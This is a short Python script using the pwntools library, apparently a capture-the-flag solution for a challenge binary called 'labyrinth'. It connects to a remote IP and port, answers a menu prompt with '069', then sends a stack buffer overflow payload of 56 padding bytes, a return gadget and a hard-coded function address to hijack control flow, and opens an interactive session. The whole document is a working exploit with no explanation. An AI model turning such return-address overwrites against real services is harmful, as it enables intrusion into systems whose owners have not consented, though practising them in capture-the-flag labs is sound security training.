from pwn import *
#p=process('./labyrinth')
p=remote('83.136.252.14',52474)
payload=b'a'*56+p64(0x0000000000401016)+p64(0x401255)
p.sendline(b'069')
input()
p.sendline(payload)
p.interactive()
